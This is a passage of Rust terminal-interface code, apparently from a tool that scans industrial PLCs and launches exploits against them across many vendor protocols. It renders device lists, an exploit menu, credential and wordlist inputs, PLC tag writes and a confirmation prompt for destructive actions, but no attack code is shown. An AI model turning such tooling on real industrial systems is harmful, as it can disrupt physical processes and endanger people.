        .constraints([Constraint::Percentage(28), Constraint::Percentage(72)])
        .split(area);
    draw_device_list(frame, chunks[0], app);
    draw_right_panel(frame, chunks[1], app);
}

fn vendor_color(vendor: &str) -> Color {
    match vendor.to_lowercase().as_str() {
        "beckhoff" => Color::Cyan,
        "siemens" => Color::Blue,
        "rockwell" | "enip" => Color::Yellow,
        "schneider" | "modicon" => Color::Green,
        "mitsubishi" => Color::Magenta,
        "phoenix" => Color::Red,
        "ewon" => Color::White,
        "omron" => Color::LightYellow,
        "iec104" => Color::LightCyan,
        "multi" => Color::Rgb(255, 140, 0),
        _ => Color::Gray,
    }
}

fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
    let filter_label = if app.filter.is_empty() {
        String::new()
    } else {
        format!(" [/{}]", app.filter)
    };
    let title = format!(" Devices ({}){filter_label} ", app.filtered_indices.len());

    let items: Vec<ListItem> = app
        .filtered_indices
        .iter()
        .map(|&idx| {
            let dev = &app.devices[idx];
            let c = vendor_color(&dev.vendor);
            let name = if dev.vendor == "multi" {
                if let Some(arr) = dev.fields.get("protocols").and_then(|v| v.as_array()) {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .collect::<Vec<_>>()
                        .join(" + ")
                } else {
                    "multi-protocol".into()
                }
            } else {
                let mut n = dev.vendor.clone();
                if let Some(s) = n.get_mut(0..1) {
                    s.make_ascii_uppercase();
                }
                n
            };
            ListItem::new(vec![
                Line::from(Span::styled(
                    format!(" {} ", dev.ip),
                    Style::default().fg(c).add_modifier(Modifier::BOLD),
                )),
                Line::from(Span::styled(
                    format!("  {name}"),
                    Style::default().fg(Color::DarkGray),
                )),
                Line::from(Span::styled(
                    format!("  {}", dev.last_seen_str()),
                    Style::default().fg(Color::DarkGray),
                )),
            ])
        })
        .collect();

    let list = List::new(items)
        .block(
            Block::default()
                .title(title.as_str())
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Cyan)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::Rgb(50, 50, 70))
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, area, &mut app.list_state);
}

fn draw_right_panel(frame: &mut Frame, area: Rect, app: &mut App) {
    match app.mode {
        Mode::ExploitMenu | Mode::ExploitInput | Mode::ExploitConfirm => {
            draw_exploit_menu(frame, area, app);
        }
        Mode::IpInput => draw_ip_input(frame, area, app),
        Mode::Search => draw_search_panel(frame, area, app),
        Mode::MqttMonitor => draw_mqtt_panel(frame, area, app),
        Mode::MqttClientIdInput => draw_mqtt_clientid_input(frame, area, app),
        Mode::MqttCredInput => draw_mqtt_cred_input(frame, area, app),
        Mode::ImportInput => draw_import_input(frame, area, app),
        Mode::WordlistInput => draw_wordlist_input(frame, area, app),
        _ => draw_detail_panel(frame, area, app),
    }
}

fn draw_detail_panel(frame: &mut Frame, area: Rect, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(40), Constraint::Percentage(60)])
        .split(area);

    let info_text = match app.selected_device() {
        Some(dev) => {
            let mut lines = vec![
                Line::from(vec![
                    Span::styled(" IP:       ", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        &dev.ip,
                        Style::default()
                            .fg(Color::Cyan)
                            .add_modifier(Modifier::BOLD),
                    ),
                ]),
                Line::from(vec![
                    Span::styled(" Vendor:   ", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        dev.vendor.to_uppercase(),
                        Style::default().fg(vendor_color(&dev.vendor)),
                    ),
                ]),
                Line::from(vec![
                    Span::styled(" Last seen:", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        format!(" {}", dev.last_seen_str()),
                        Style::default().fg(Color::Gray),
                    ),
                ]),
                Line::from(""),
            ];
            append_capability_lines(dev, &mut lines);
            if let Value::Object(map) = &dev.fields {
                for (k, v) in map {
                    let val_str = match v {
                        Value::String(s) if !s.is_empty() => s.clone(),
                        // booleans are shown via capability lines; objects are per-vendor
                        // blobs for multi devices; protocols key is handled separately
                        Value::Null | Value::String(_) | Value::Bool(_) | Value::Object(_) => {
                            continue
                        }
                        _ if k == "protocols" => continue,
                        Value::Array(arr) => arr
                            .iter()
                            .map(ToString::to_string)
                            .collect::<Vec<_>>()
                            .join(", "),
                        other @ Value::Number(_) => other.to_string(),
                    };
                    lines.push(Line::from(vec![
                        Span::styled(format!(" {k}:"), Style::default().fg(Color::DarkGray)),
                        Span::styled(format!(" {val_str}"), Style::default().fg(Color::White)),
                    ]));
                }
            }
            lines.push(Line::from(""));
            lines.push(Line::from(Span::styled(
                " [E] Exploit menu  [R] Rescan  [D] Delete",
                Style::default().fg(Color::Yellow),
            )));
            lines
        }
        None => vec![
            Line::from(""),
            Line::from(Span::styled(
                " No device selected.",
                Style::default().fg(Color::DarkGray),
            )),
            Line::from(""),
            Line::from(Span::styled(
                " [A] Add / probe IP   [S] Broadcast scan",
                Style::default().fg(Color::DarkGray),
            )),
        ],
    };

    frame.render_widget(
        Paragraph::new(info_text)
            .block(
                Block::default()
                    .title(" Device Info ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        chunks[0],
    );

    frame.render_widget(
        output_widget(&app.output_lines, chunks[1].height, app.output_scroll),
        chunks[1],
    );
}

fn append_capability_lines(dev: &DeviceRecord, lines: &mut Vec<Line<'_>>) {
    let vendor = dev.vendor.to_ascii_lowercase();

    if vendor == "multi" {
        let protocols: Vec<String> = dev
            .fields
            .get("protocols")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();

        for proto in &protocols {
            lines.push(Line::from(Span::styled(
                format!(" {proto}:"),
                Style::default()
                    .fg(vendor_color(proto))
                    .add_modifier(Modifier::BOLD),
            )));
            if let Some(Value::Object(sub_map)) = dev.fields.get(proto) {
                let sub_dev = DeviceRecord {
                    id: dev.id,
                    ip: dev.ip.clone(),
                    vendor: proto.clone(),
                    last_seen: dev.last_seen,
                    fields: Value::Object(sub_map.clone()),
                };
                append_capability_lines(&sub_dev, lines);
            }
        }
        return;
    }

    let caps: &[(&str, CapabilityKey)] = match vendor.as_str() {
        "beckhoff" => &[
            ("ads tcp", CapabilityKey::BeckhoffAds),
            ("udp discovery", CapabilityKey::BeckhoffUdpDiscovery),
            ("web candidate", CapabilityKey::BeckhoffWeb),
        ],
        "siemens" => &[("s7 tcp", CapabilityKey::S7Tcp)],
        "rockwell" | "enip" => &[("ethernet/ip", CapabilityKey::EnipTcp)],
        "schneider" | "modicon" => &[
            ("identity", CapabilityKey::SchneiderIdentity),
            ("modbus tcp", CapabilityKey::SchneiderModbus),
            ("web candidate", CapabilityKey::SchneiderWeb),
        ],
        "mitsubishi" => &[
            ("identity", CapabilityKey::MitsubishiIdentity),
            ("udp control", CapabilityKey::MitsubishiControlUdp),
            ("slmp tcp", CapabilityKey::SlmpTcp),
        ],
        "phoenix" => &[
            ("proconos info", CapabilityKey::PhoenixInfo),
            ("webvisit", CapabilityKey::PhoenixWebVisit),
        ],
        "omron" => &[("fins tcp", CapabilityKey::FinsTcp)],
        "ewon" => &[("http", CapabilityKey::EwonHttp)],
        "iec104" => &[("iec104 tcp", CapabilityKey::Iec104Tcp)],
        _ => &[],
    };
    if caps.is_empty() {
        return;
    }

    lines.push(Line::from(Span::styled(
        " Protocol capabilities:",
        Style::default()
            .fg(vendor_color(&dev.vendor))
            .add_modifier(Modifier::BOLD),
    )));
    for (label, capability) in caps {
        lines.push(capability_line(
            label,
            capability_availability(dev, *capability).enabled,
        ));
    }

    if matches!(vendor.as_str(), "schneider" | "modicon") {
        let caps = SchneiderCapabilities::from_device(dev);
        lines.push(capability_line(
            "udp discovery",
            caps.udp_discovery_confirmed,
        ));
        lines.push(Line::from(vec![
            Span::styled(" modbus port:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                format!(" :{}", caps.modbus_port),
                Style::default().fg(Color::White),
            ),
        ]));
        lines.push(Line::from(vec![
            Span::styled(" web port:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                match caps.web_port {
                    Some(port) => format!(" :{port}"),
                    None if caps.web_candidate() => " :80".to_string(),
                    None => " none".to_string(),
                },
                Style::default().fg(if caps.web_candidate() {
                    Color::White
                } else {
                    Color::DarkGray
                }),
            ),
        ]));
        lines.push(Line::from(vec![
            Span::styled(" fc90 family:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                format!(" {}", caps.fc90_family.label()),
                Style::default().fg(if caps.fc90_family == SchneiderFamily::Unknown {
                    Color::DarkGray
                } else {
                    Color::Yellow
                }),
            ),
        ]));
    }
    lines.push(Line::from(""));
}

fn capability_line<'a>(label: &'static str, yes: bool) -> Line<'a> {
    Line::from(vec![
        Span::styled(format!(" {label}:"), Style::default().fg(Color::DarkGray)),
        Span::styled(
            if yes { " yes" } else { " no" },
            Style::default().fg(if yes { Color::Green } else { Color::DarkGray }),
        ),
    ])
}

fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &mut App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(45), Constraint::Percentage(55)])
        .split(area);

    let vendor = app.selected_vendor().unwrap_or_default();
    let port_label = {
        let p = app.action_port(&vendor, app.exploit_sel);
        if p == 0 {
            String::new()
        } else {
            format!(" :{p}")
        }
    };
    let title = match &app.vendor_override {
        None if vendor == "multi" => {
            " Exploits \u{2014} MULTI  [V] Select a protocol to continue ".to_string()
        }
        None => format!(" Exploits \u{2014} {}{port_label} ", vendor.to_uppercase()),
        Some(ov) => {
            let stored = app
                .selected_device()
                .map(|d| d.vendor.to_uppercase())
                .unwrap_or_default();
            format!(
                " Exploits \u{2014} {stored} [as {}]{port_label} ",
                ov.to_uppercase()
            )
        }
    };

    let items: Vec<ListItem> = app
        .exploit_defs
        .iter()
        .map(|e| {
            let availability = action_availability(app, e);
            let suffix = if availability.enabled {
                match e.risk {
                    ExploitRisk::ReadOnly => String::new(),
                    ExploitRisk::SensitiveRead
                    | ExploitRisk::LongRunning
                    | ExploitRisk::WriteControl => " [confirm]".to_string(),
                }
            } else {
                unavailable_suffix(availability.reason)
            };
            let c = if !availability.enabled || e.label.starts_with('\u{2190}') {
                Color::DarkGray
            } else if e.risk == ExploitRisk::WriteControl {
                Color::Red
            } else if e.risk == ExploitRisk::LongRunning {
                Color::LightYellow
            } else if e.risk == ExploitRisk::SensitiveRead {
                Color::Magenta
            } else if e.needs_input {
                Color::Yellow
            } else {
                Color::White
            };
            ListItem::new(Line::from(Span::styled(
                format!(" {}{} ", e.label, suffix),
                Style::default().fg(c),
            )))
        })
        .collect();

    let list = List::new(items)
        .block(
            Block::default()
                .title(title.as_str())
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Yellow)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::Rgb(50, 50, 70))
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, chunks[0], &mut app.exploit_list_state);
    frame.render_widget(
        output_widget(&app.output_lines, chunks[1].height, app.output_scroll),
        chunks[1],
    );
}

/// Build a map from leaf cursor position → absolute output line index.
/// Matches both struct leaf rows (`"           .field"` prefix) and flat scalar tag
/// rows (numeric instance-id at columns 2-8, tag name at columns 10-52).
/// Scans only lines from the most recent tag listing (found via the INST header).
/// Map output lines to their corresponding leaf index.
/// Returns `(line_idx, leaf_idx)` pairs in document order.
///
/// Uses contextual matching: INST table rows establish which struct tag owns the
/// subsequent member lines, forming the full path `StructTag.Field` for lookup.
/// This correctly handles multiple struct tags that share identically-named fields.
fn build_leaf_line_indices(lines: &[String], leaves: &[(String, bool)]) -> Vec<(usize, usize)> {
    if leaves.is_empty() {
        return Vec::new();
    }
    // Start from the most recent tag-table header — identified by the "#  Name" column label
    // produced by tag_header(). Using rposition ensures only the last (live) listing is scanned
    // even when a DB snapshot section appears earlier in output_lines.
    let table_start = lines
        .iter()
        .rposition(|l| l.contains("#  Name"))
        .unwrap_or(0);

    // Build a lookup: full symbolic path → leaf index.
    let mut path_to_leaf: std::collections::HashMap<&str, usize> =
        std::collections::HashMap::with_capacity(leaves.len());
    for (i, (path, _)) in leaves.iter().enumerate() {
        path_to_leaf.entry(path.as_str()).or_insert(i);
    }

    let mut result: Vec<(usize, usize)> = Vec::new();
    let mut used_leaves: std::collections::HashSet<usize> = std::collections::HashSet::new();
    // Name of the struct tag whose members we are currently reading.
    let mut current_struct: Option<String> = None;

    for (offset, line) in lines[table_start..].iter().enumerate() {
        let abs = table_start + offset;

        if let Some(after_dot) = line.strip_prefix("           .") {
            // Struct member line: "           .FieldOrPath  value"
            let field_end = after_dot
                .find(|c: char| c.is_whitespace())
                .unwrap_or(after_dot.len());
            let field = &after_dot[..field_end];
            if let Some(ref parent) = current_struct {
                let full_path = format!("{parent}.{field}");
                if let Some(&leaf_idx) = path_to_leaf.get(full_path.as_str()) {
                    if !used_leaves.contains(&leaf_idx) {
                        used_leaves.insert(leaf_idx);
                        result.push((abs, leaf_idx));
                    }
                }
            }
        } else if line
            .get(2..8)
            .is_some_and(|s| s.trim().parse::<u64>().is_ok())
            && line.is_char_boundary(10)
            && line.is_char_boundary(line.len().min(52))
        {
            // INST table row: "  {id:>6}  {name:<42}  type  dims  value  typeword"
            let name = line[10..line.len().min(52)].trim_end().to_string();
            // Check if this is a flat scalar leaf (path has no dot).
            if let Some(&leaf_idx) = path_to_leaf.get(name.as_str()) {
                if !used_leaves.contains(&leaf_idx) {
                    used_leaves.insert(leaf_idx);
                    result.push((abs, leaf_idx));
                }
            }
            // Update struct context for the member lines that follow.
            current_struct = Some(name);
        }
    }

    result
}

fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let filter_lc = app.output_filter.to_lowercase();
    let filtered: Vec<&str> = if filter_lc.is_empty() {
        app.output_lines.iter().map(String::as_str).collect()
    } else {
        app.output_lines
            .iter()
            .filter(|l| l.to_lowercase().contains(&filter_lc))
            .map(String::as_str)
            .collect()
    };
    let total = filtered.len();
    let end = total
        .saturating_sub(app.output_scroll)
        .max(visible.min(total));
    let start = end.saturating_sub(visible);

    // Leaf cursor is relative to unfiltered line indices — disable while filter is active.
    let cursor_abs: Option<usize> = if filter_lc.is_empty() {
        app.output_leaf_cursor
            .and_then(|n| app.tag_leaf_line_indices.get(n).map(|&(li, _)| li))
    } else {
        None
    };

    let text: Vec<Line> = filtered[start..end]
        .iter()
        .enumerate()
        .map(|(i, l)| {
            let abs = start + i;
            if cursor_abs == Some(abs) {
                return Line::from(Span::styled(
                    *l,
                    Style::default().fg(Color::Black).bg(Color::Cyan),
                ));
            }
            let c = output_line_color(l);
            Line::from(Span::styled(*l, Style::default().fg(c)))
        })
        .collect();

    let is_overview = app.output_from_cache && app.scan_timestamp.is_none();
    let is_stale = app.output_from_cache
        && app
            .scan_timestamp
            .is_some_and(|t| t.elapsed() > std::time::Duration::from_secs(24 * 3600));
    let out_label = if is_overview {
        "Overview"
    } else if is_stale {
        "Output \u{26a0}"
    } else {
        "Output"
    };
    let c_hint = if app.output_line_backup.is_some() {
        "[C] restore"
    } else {
        "[C] clear"
    };

    // Access class of the currently selected leaf (for the cursor mode title).
    let current_access: &str = app
        .output_leaf_cursor
        .and_then(|n| app.tag_leaf_line_indices.get(n).map(|&(_, li)| li))
        .and_then(|li| app.tag_leaves.get(li))
        .map_or("User", |(path, _)| {
            let top = path.find('.').map_or(path.as_str(), |i| &path[..i]);
            tag_access_class(top)
        });

    let title = if app.output_leaf_cursor.is_some() && !app.tag_leaves.is_empty() {
        let n = app.output_leaf_cursor.unwrap_or(0);
        let warn = if is_overview || is_stale {
            " \u{2014} \u{26a0} tags may have changed"
        } else {
            ""
        };
        let access_note = match current_access {
            "Input" => "  [Input \u{2014} hardware owned]",
            "Output" => "  [Output \u{2014} PLC overrides in Run mode]",
            "Config" => "  [Config \u{2014} writable in Program mode]",
            _ => "",
        };
        format!(
            " {out_label} \u{2014} leaf {}/{}{access_note}{warn} \u{2014} [J/K] navigate  [W] write  {c_hint}  [O/ESC] close ",
            n + 1,
            app.tag_leaves.len()
        )
    } else if !app.tag_leaves.is_empty() {
        let warn = if is_overview {
            " \u{2014} \u{26a0} DB snapshot"
        } else if is_stale {
            " \u{2014} \u{26a0} >24h old"
        } else {
            ""
        };
        format!(
            " {out_label} \u{2014} {} navigable tags{warn} \u{2014} [I] interactive  [J/K] navigate  [W] write  {c_hint}  [O/ESC] close ",
            app.tag_leaves.len()
        )
    } else if total == 0 && app.output_line_backup.is_some() {
        format!(" {out_label} (cleared) \u{2014} {c_hint} to restore  [O/ESC] close ")
    } else if total == 0 {
        " Output (empty) \u{2014} run [List Tags] first to enable [W] write ".to_string()
    } else if app.output_scroll == 0 {
        format!(" {out_label} \u{2014} {total} lines \u{2014} {c_hint}  [O/ESC] close ")
    } else {
        format!(
            " {out_label} \u{2014} {}\u{2013}{}/{} \u{2014} [O/ESC] close ",
            start + 1,
            end,
            total
        )
    };
    let title = if app.output_filter_active || !app.output_filter.is_empty() {
        let cursor = if app.output_filter_active {
            "\u{2588}"
        } else {
            ""
        };
        let n_raw = app.output_lines.len();
        let suffix = if filter_lc.is_empty() {
            format!("  [/{cursor}]")
        } else {
            format!(
                "  [/{}{cursor} \u{2014} {}/{} match{}]",
                app.output_filter,
                total,
                n_raw,
                if total == 1 { "" } else { "es" }
            )
        };
        format!("{}{suffix}", title.trim_end())
    } else {
        title
    };

    let legend = Line::from(vec![
        Span::raw(" "),
        Span::styled("\u{25a0}", Style::default().fg(Color::White)),
        Span::raw(" User  "),
        Span::styled("\u{25a0}", Style::default().fg(Color::Yellow)),
        Span::raw(" Input (hw)  "),
        Span::styled("\u{25a0}", Style::default().fg(Color::Cyan)),
        Span::raw(" Output (PLC)  "),
        Span::styled("\u{25a0}", Style::default().fg(Color::Magenta)),
        Span::raw(" Config "),
    ]);

    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(title)
                    .title_bottom(legend)
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

/// Colour for one output line.  Shared by the zoom view and the sidebar widget.
fn output_line_color(l: &str) -> Color {
    if l.starts_with("══") {
        Color::Cyan
    } else if l.trim_start().starts_with("──") {
        Color::DarkGray
    } else if l.starts_with("[+]") {
        Color::Green
    } else if l.starts_with("[-]") {
        Color::Red
    } else if l.starts_with("[!]") || l.ends_with("Input ") || l.ends_with("Input") {
        Color::Yellow
    } else if l.ends_with("Output") {
        Color::Cyan
    } else if l.ends_with("Config") {
        Color::Magenta
    } else {
        Color::White
    }
}

fn output_widget(lines: &[String], height: u16, scroll: usize) -> Paragraph<'_> {
    let visible = height.saturating_sub(2) as usize;
    let total = lines.len();

    // scroll=0 → auto-scroll to bottom; scroll=N → N lines from the bottom upward
    let end = total.saturating_sub(scroll).max(visible.min(total));
    let start = end.saturating_sub(visible);

    let text: Vec<Line> = lines[start..end]
        .iter()
        .map(|l| {
            let c = output_line_color(l);
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();

    let title = if scroll == 0 || total <= visible {
        if total > visible {
            format!(" Output [{total} lines \u{2191}PgUp] ")
        } else {
            " Output ".to_string()
        }
    } else {
        format!(
            " Output [{}\u{2013}{}/{} \u{2191}\u{2193}PgUp/PgDn] ",
            start + 1,
            end,
            total
        )
    };

    Paragraph::new(text)
        .block(
            Block::default()
                .title(title)
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        )
        .wrap(Wrap { trim: false })
}

fn draw_ip_input(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Enter IP address to probe:",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Runs auto-detection across all vendors. ENTER to start, ESC to cancel.",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Add / Probe IP ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn draw_search_panel(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Filter devices by IP or vendor:",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  / {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Green)
                .add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Search ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Green)),
        ),
        area,
    );
}

fn draw_log_strip(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let text: Vec<Line> = app
        .logs
        .iter()
        .rev()
        .take(visible)
        .rev()
        .map(|l| {
            let c = if l.starts_with("[+]") {
                Color::Green
            } else if l.starts_with("[-]") {
                Color::Red
            } else if l.starts_with("[!]") {
                Color::Yellow
            } else {
                Color::DarkGray
            };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Activity Log ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        ),
        area,
    );
}

fn draw_scan_menu(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(52, 50, area);
    frame.render_widget(Clear, popup);

    let items: Vec<ListItem> = SCAN_ITEMS
        .iter()
        .map(|s| {
            let c = if s.starts_with('\u{2190}') {
                Color::DarkGray
            } else {
                Color::White
            };
            ListItem::new(Line::from(Span::styled(
                format!("  {s}  "),
                Style::default().fg(c),
            )))
        })
        .collect();
    let mut state = ListState::default();
    state.select(Some(app.scan_menu_sel));

    let list = List::new(items)
        .block(
            Block::default()
                .title(" Broadcast Scan ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Cyan)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::Rgb(50, 50, 70))
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(list, popup, &mut state);
}

fn draw_exploit_input_popup(frame: &mut Frame, area: Rect, app: &App) {
    let hint = app
        .exploit_defs
        .get(app.exploit_sel)
        .map_or("parameter", |e| e.input_hint);
    let popup = centered_rect(60, 25, area);
    frame.render_widget(Clear, popup);

    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            format!(" Enter {hint}:"),
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Yellow)
                .add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Exploit Parameter ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Yellow)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_exploit_confirm_popup(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(64, 34, area);
    frame.render_widget(Clear, popup);
    let pending = app.pending_exploit.as_ref();
    let label = pending.map_or("action", |p| p.label.as_str());
    let ip = pending.map_or("-", |p| p.ip.as_str());
    let port = pending.map_or(0, |p| p.port);
    let input = pending
        .and_then(|p| {
            if p.input.trim().is_empty() {
                None
            } else {
                Some(p.input.as_str())
            }
        })
        .unwrap_or("-");
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " This action may write, control, or run for a long time.",
            Style::default().fg(Color::Yellow),
        )),
        Line::from(""),
        Line::from(vec![
            Span::styled(" Action:", Style::default().fg(Color::DarkGray)),
            Span::styled(format!(" {label}"), Style::default().fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled(" Target:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                if port == 0 {
                    format!(" {ip}")
                } else {
                    format!(" {ip}:{port}")
                },
                Style::default().fg(Color::White),
            ),
        ]),
        Line::from(vec![
            Span::styled(" Input: ", Style::default().fg(Color::DarkGray)),
            Span::styled(input.to_string(), Style::default().fg(Color::White)),
        ]),
        Line::from(""),
        Line::from(Span::styled(
            " Type YES and press ENTER to continue.",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Confirm Action ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Red)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_help(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(58, 75, area);
    frame.render_widget(Clear, popup);

    let s = Style::default();
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Navigation",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  J / \u{2193}    Next device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  K / \u{2191}    Prev device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  /        Search / filter",
            s.fg(Color::White),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Device Actions",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  A        Add / probe single IP",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "           Forms: IP, IP:1502 tcp, IP:5007 mitsubishi, IP:48898 beckhoff",
            s.fg(Color::DarkGray),
        )),
        Line::from(Span::styled(
            "  S        Broadcast scan (all or by vendor)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  E        Open exploit menu for selected device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  W        Open research references for selected vendor",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  R        Rescan selected device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  D        Delete selected device from database",
            s.fg(Color::White),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Exploit Menu",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  J/K      Navigate exploit list",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  ENTER    Run selected exploit",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  V        View as a different protocol",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Yellow   Exploit requires input parameter",
            s.fg(Color::Yellow),
        )),
        Line::from(Span::styled(
            "  Magenta  Sensitive read (credentials / session data)",
            s.fg(Color::Magenta),
        )),
        Line::from(Span::styled(
            "  Red      Destructive: writes / controls PLC state",
            s.fg(Color::Red),
        )),
        Line::from(Span::styled(
            "  Gray     Action unavailable for detected capabilities",
            s.fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Device List Colors",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Cyan)),
            Span::styled("Cyan        Beckhoff TwinCAT", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Blue)),
            Span::styled("Blue        Siemens S7", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Yellow)),
            Span::styled(
                "Yellow      Rockwell / EtherNet\u{b7}IP",
                s.fg(Color::White),
            ),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Green)),
            Span::styled("Green       Schneider / Modicon", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Magenta)),
            Span::styled("Magenta     Mitsubishi MELSEC", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Red)),
            Span::styled("Red         Phoenix Contact", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::LightYellow)),
            Span::styled("Lt.Yellow   Omron FINS", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::LightCyan)),
            Span::styled("Lt.Cyan     IEC 60870-5-104", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::White)),
            Span::styled("White       eWON Flexy", s.fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Rgb(255, 140, 0))),
            Span::styled(
                "Orange      Multi-service host (multiple protocols)",
                s.fg(Color::White),
            ),
        ]),
        Line::from(vec![
            Span::styled("  \u{25cf} ", s.fg(Color::Gray)),
            Span::styled("Gray        Unknown / SNMP-only", s.fg(Color::White)),
        ]),
        Line::from(""),
        Line::from(Span::styled(
            " Output",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  O        Zoom output panel fullscreen",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  C        Clear output panel",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  PgUp/Dn  Scroll output (any mode)",
            s.fg(Color::White),
        )),
